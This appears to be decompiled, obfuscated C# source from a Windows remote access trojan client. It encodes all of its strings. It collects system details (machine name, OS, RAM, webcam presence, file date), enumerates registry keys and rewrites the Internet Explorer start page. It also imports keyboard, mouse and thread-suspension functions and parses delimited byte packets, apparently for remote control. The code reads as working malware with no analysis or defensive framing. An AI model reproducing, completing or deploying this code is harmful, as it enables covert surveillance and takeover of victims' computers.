using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using O;

namespace ns0;

[StandardModule]
internal sealed class Class2
{
	public enum Enum1
	{

	}

	private static string string_0 = Class4.smethod_6(Class4.smethod_6(Class4.smethod_6(Class4.smethod_6(Class4.smethod_6(Class10.smethod_6<ComputerInfo>(((ServerComputer)Class6.Object_3).get_Info(), (short)882, '\u0332'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueea7\uee83\uee89\uee98\uee85\uee99\uee85\uee8c\uee9e", 61427), 60876), 60597), "", 663, '\u02ef'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue108\ue136\ue131\ue13b\ue130\ue128\ue12c", 61932), 62874), 58642), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻸﻆﻁ", 58988), 63517), 57564), 0, 'x'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec20", 62915), 61164), 63262), "", 494, 'Ɩ'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("푘", 62187), 62846), 62062), "", 654, '\u02f6'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf77a\uf77a", 57839), 58646), 62379), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue2d2", 57611), 58650), 58915), 518, 'ɾ').Replace(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf795\uf7e2\uf7dc\uf7db", 61337), 62167), 60117), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻸﻆﻁ", 58988), 63517), 57564));

	public static string string_1;

	public static object object_0 = new FileInfo(Application.get_ExecutablePath());

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_3, int int_1);

	public static Array smethod_0(byte[] byte_0, string string_2)
	{
		object obj = new List<byte[]>();
		object obj2 = new MemoryStream();
		object obj3 = new MemoryStream();
		string[] array = GClass2.DRV.smethod_7(smethod_8(ref byte_0), string_2, -1, (CompareMethod)0, '\u0375', 'Ϳ');
		string text = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻰﻕﻎﻓﻂ", 62899), 58499), 61422);
		object[] obj4 = new object[3]
		{
			byte_0,
			0,
			GClass2.DRV.smethod_1(array[0], 433, 495)
		};
		object[] array2 = obj4;
		bool[] obj5 = new bool[3] { true, false, false };
		bool[] array3 = obj5;
		NewLateBinding.LateCall(obj2, (Type)null, text, obj4, (string[])null, (Type[])null, obj5, true);
		if (array3[0])
		{
			byte_0 = (byte[])Class10.smethod_7(GForm1.smethod_18(array2[0], 187, 228), typeof(byte[]), 1019, 941);
		}
		NewLateBinding.LateCall(obj3, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻰﻕﻎﻓﻂ", 62899), 58499), 61422), array2 = checked(new object[3]
		{
			byte_0,
			GClass2.DRV.smethod_1(array[0], 861, 771) + GClass2.DRV.smethod_1(string_2, 774, 856),
			byte_0.Length - (GClass2.DRV.smethod_1(array[0], 374, 296) + GClass2.DRV.smethod_1(string_2, 523, 597))
		}), (string[])null, (Type[])null, array3 = new bool[3] { true, false, false }, true);
		if (array3[0])
		{
			byte_0 = (byte[])Class10.smethod_7(GForm1.smethod_18(array2[0], 818, 877), typeof(byte[]), 259, 341);
		}
		string text2 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("צּﭣﭣ", 57914), 61711), 59476);
		object[] array4 = new object[1];
		object obj6 = obj2;
		array4[0] = NewLateBinding.LateGet(obj6, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1b9\uf182\uf1ac\uf19f\uf19f\uf18c\uf194", 59871), 59529), 61537), new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array4;
		NewLateBinding.LateCall(obj, (Type)null, text2, array4, (string[])null, (Type[])null, array3 = new bool[1] { true }, true);
		if (array3[0])
		{
			GClass2.smethod_6<Type, string, object>(obj6, null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1b9\uf182\uf1ac\uf19f\uf19f\uf18c\uf194", 59871), 59529), 61537), new object[1] { array2[0] }, null, null, bool_0: true, bool_1: false, 301, 356);
		}
		string text3 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("צּﭣﭣ", 57914), 61711), 59476);
		object[] array5 = new object[1];
		obj6 = obj3;
		array5[0] = NewLateBinding.LateGet(obj6, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1b9\uf182\uf1ac\uf19f\uf19f\uf18c\uf194", 59871), 59529), 61537), new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array5;
		NewLateBinding.LateCall(obj, (Type)null, text3, array5, (string[])null, (Type[])null, array3 = new bool[1] { true }, true);
		if (array3[0])
		{
			GClass2.smethod_6<Type, string, object>(obj6, null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1b9\uf182\uf1ac\uf19f\uf19f\uf18c\uf194", 59871), 59529), 61537), new object[1] { array2[0] }, null, null, bool_0: true, bool_1: false, 554, 611);
		}
		NewLateBinding.LateCall(obj2, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec1f\uec32\uec28\uec2b\uec34\uec28\uec3e", 63142), 61145), 62514), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj3, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec1f\uec32\uec28\uec2b\uec34\uec28\uec3e", 63142), 61145), 62514), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1b9\uf182\uf1ac\uf19f\uf19f\uf18c\uf194", 59871), 59529), 61537), new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern uint SuspendThread(IntPtr intptr_0);

	public static string smethod_1()
	{
		_ = Environment.OSVersion;
		string gparam_ = (string)(IComparable)GClass1.smethod_3(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2dd\uf2ae\uf2ad", 58155), 62621), 58843), 372, 305);
		string[] array = GClass2.DRV.smethod_7(Class5.smethod_10(Environment.OSVersion, 958, 914), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue2d2", 57611), 58650), 58915), -1, (CompareMethod)0, 'ȱ', 'Ȼ');
		if (array.Length == 1)
		{
			gparam_ = (string)(IComparable)GClass1.smethod_3(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue69d", 63072), 57858), 62002), 388, 449);
		}
		gparam_ = (string)(IComparable)GClass1.smethod_3(gparam_, array[checked(array.Length - 1)], 198, 131);
		if (Class5.smethod_11(GClass2.smethod_7(Class11.smethod_13(Registry.LocalMachine, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf4f9\uf4d0\uf4c3\uf4d5\uf4c6\uf4d0\uf4c3\uf4d4\uf4ed\uf4f5\uf4d4\uf4c2\uf4d2\uf4c3\uf4d8\uf4c1\uf4c5\uf4d8\uf4de\uf4df\uf4ed\uf4e2\uf4c8\uf4c2\uf4c5\uf4d4\uf4dc\uf4ed\uf4f2\uf4d4\uf4df\uf4c5\uf4c3\uf4d0\uf4dd\uf4e1\uf4c3\uf4de\uf4d2\uf4d4\uf4c2\uf4c2\uf4de\uf4c3\uf4ed\uf481", 61602), 60270), 61353), 455, 506), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﮎﮣﮢﮩ\ufbb3ﮮﮡﮮﮢ\ufbb5", 57797), 62221), 59829), '\u0012', 19), 642, 645).Contains(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8ff\uf8bf\uf8b1", 59196), 63206), 59782)))
		{
			return (string)(IComparable)(gparam_ + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf169\uf131\uf171\uf17f", 62757), 63216), 62095));
		}
		return (string)(IComparable)(gparam_ + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf72c\uf774\uf73a\uf738", 61578), 58850), 57908));
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr OpenThread(Enum1 enum1_0, bool bool_0, uint uint_0);

	public static string smethod_2()
	{
		string result = (string)(IEnumerable)"";
		checked
		{
			long num = (long)GForm1.smethod_10(Class5.smethod_12((object)((ServerComputer)Class6.Object_3).get_Info().get_TotalPhysicalMemory(), (short)630, 607), 'ʊ', 'ʻ');
			if (num > 1073741824L)
			{
				result = (string)(IEnumerable)((double)num / 1073741824.0).ToString();
				result = (string)(IEnumerable)GClass1.smethod_3(GClass1.smethod_1(result, 4, GClass2.DRV.smethod_1(result, 648, 726) - 4, 683, 749), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueefc\uee9b\uee9e", 62590), 62494), 61097), 940, 1001);
			}
			else if (num > 1048576L)
			{
				result = (string)(IEnumerable)((double)num / 1048576.0).ToString();
				result = (string)(IEnumerable)(result.Remove(4, GClass2.DRV.smethod_1(result, 991, 897) - 4) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8e4\ue889\ue8ab", 59719), 58029), 58290));
			}
			return result;
		}
	}

	public static string smethod_3()
	{
		try
		{
			return (string)(IComparable<string>)((FileInfo)object_0).LastWriteTime.ToString(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf7b2\uf7b2\uf7b2\uf7b2\uf7e6\uf786\uf786\uf7e6\uf7af\uf7af", 58270), 62455), 59296));
		}
		catch (Exception gparam_)
		{
			GForm1.smethod_6(gparam_, 'ȓ', 564);
			string result = (string)(IComparable<string>)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1c9\ue1d2\ue1d7\ue1d2\ue1d3\ue1cb\ue1d2", 58569), 58960), 58300);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_4()
	{
		checked
		{
			try
			{
				string string_ = Class10.smethod_2(100, 'Ϥ', 1010);
				int num = 0;
				do
				{
					short short_ = (short)num;
					string string_2 = null;
					if (!capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						num++;
						continue;
					}
					return Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec27\uec1b\uec0d", 61947), 58642), 63509);
				}
				while (num <= 4);
			}
			catch (Exception gparam_)
			{
				GForm1.smethod_6(gparam_, 'L', 107);
				Class5.smethod_4('ƚ', 495);
			}
			return Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue505\ue524", 57719), 57681), 58691);
		}
	}

	public static void smethod_5()
	{
		try
		{
			string[] array = GForm1.smethod_15(Class11.smethod_13(Registry.CurrentUser, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﮆ\ufbba\ufbb3ﮡﮢ\ufbb4ﮧﮰﮉﮌ\ufbb4\ufbbd\ufbba\ufbbaﮉﮅﮧ\ufbba\ufbb3\ufbbc\ufbb9ﮰﮦ", 57832), 61943), 60380), 787, 814), 695, 665);
			foreach (string gparam_ in array)
			{
				string_1 = Class4.smethod_0(string_1, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec82\uecab\uecac\uecb2\uec82\uecde\uec96\uec8a\uec8a\uec8e\uecc4\uecd1\uecd1\ueca7\uec9f\uec96\uec91\uec91\uecd0\uec9d\uec91\uec93\uecf3\uecf4\uec82\uecab\uecad\uecac\uec82\uecde", 57418), 59408), 58526), gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue2d2\ue2d5\ue2a3\ue28f\ue288\ue29b\ue2a3\ue2ff\ue2d2\ue2d5", 63141), 58029), 63108), 750, 695);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MapVirtualKeyA(int int_0, int int_1);

	public static void smethod_6(string string_2)
	{
		Registry.CurrentUser.OpenSubKey(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued46\ued7a\ued73\ued61\ued62\ued74\ued67\ued70\ued49\ued58\ued7c\ued76\ued67\ued7a\ued66\ued7a\ued73\ued61\ued49\ued5c\ued7b\ued61\ued70\ued67\ued7b\ued70\ued61\ued35\ued50\ued6d\ued65\ued79\ued7a\ued67\ued70\ued67\ued49\ued58\ued74\ued7c\ued7b", 60081), 58615), 58127), writable: true)!.SetValue(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf6e2\uf6c5\uf6d0\uf6c3\uf6c5\uf691\uf6e1\uf6d0\uf6d6\uf6d4", 63487), 59175), 59129), string_2);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void keybd_event(byte byte_0, byte byte_1, int int_0, int int_1);

	[DllImport("kernel32")]
	public static extern void Beep(int int_0, int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

	public static byte[] smethod_7(ref string string_2)
	{
		return Class3.smethod_10(825, '\u0340').GetBytes(string_2);
	}

	public static string smethod_8(ref byte[] byte_0)
	{
		return Class3.smethod_10(678, '\u02df').GetString(byte_0);
	}
}
